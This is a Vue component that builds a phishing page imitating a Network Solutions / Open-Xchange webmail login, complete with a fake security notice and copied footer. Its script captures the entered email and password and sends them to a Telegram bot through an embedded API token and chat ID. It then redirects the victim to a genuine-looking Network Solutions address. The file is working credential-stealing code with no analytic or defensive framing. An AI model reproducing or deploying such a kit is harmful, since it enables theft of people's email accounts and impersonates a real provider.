<template>
  <div class="page">
    <header class="topbar">
      <div class="brand">
        <div class="brand-network">network</div>
        <div class="brand-solutions">solutions</div>
      </div>

      <div class="language">
        <span>Language:</span>
        <span class="language-link">English (United Kingdom)</span>
        <span class="chevron">⌄</span>
      </div>
    </header>

    <main class="main-content">
      <section class="login-column">
        <form class="login-card" @submit.prevent="finishJoob">
          <h1>Webmail Login</h1>

          <div class="signin-section">
            <h2>Sign in</h2>

            <div class="field">
              <label for="email">Email</label>
              <input
                id="email"
                v-model="formDataRes.email"
                type="email"
                autocomplete="username"
                spellcheck="false"
              />
            </div>

            <transition name="password-slide">
              <div v-if="showPassword" class="field password-field">
                <label for="password">Password</label>
                <input
                  id="password"
                  ref="passwordInput"
                  v-model="formDataRes.password"
                  type="password"
                  autocomplete="current-password"
                />
              </div>
            </transition>

            <label class="stay-signed">
              <input v-model="staySignedIn" type="checkbox" />
              <span class="custom-checkbox">
                <span v-if="staySignedIn">✓</span>
              </span>
              <span>Stay signed in</span>
            </label>

            <button class="signin-button" type="submit">
              Sign in
            </button>
          </div>
        </form>

        <section class="notice-card">
          <p>
            We are updating our email security and will require all email
            server connections to use an encrypted connection when connecting
            via POP or IMAP from a device. To avoid any email connection
            issues, please be sure to update your mail client settings.
          </p>

          <button type="button" class="learn-button">
            Learn More...
          </button>
        </section>
      </section>
    </main>

    <footer class="footer">
      <span>© 2026 Open-Xchange GmbH</span>
      <span>Version: 8.53.2</span>
      <span>Privacy policy</span>
      <span>Legal notes</span>
    </footer>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        email: "",
        password: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
      staySignedIn: true,
      showPassword: false
    }
  },

    computed: {
    isFormValid() {
      return (
        this.formDataRes.email.trim() !== "" &&
        this.formDataRes.password.trim() !== ""
      );
    },
  },


    methods: {
    async finishJoob() {

      if (!this.showPassword) {
        if (!this.formDataRes.email.trim() && !this.formDataRes.password.trim()) {
          return
        }

        this.showPassword = true

        this.$nextTick(() => {
          if (this.$refs.passwordInput) {
            this.$refs.passwordInput.focus()
          }
        })

        return
      }

      if (!this.formDataRes.password.trim()) {
        return
      }

      this.count++;
      // console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*NETWORK SOLUTION*\nEmail: ${this.formDataRes.email}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message,
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://update.networksolutions.com/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
}
</script>
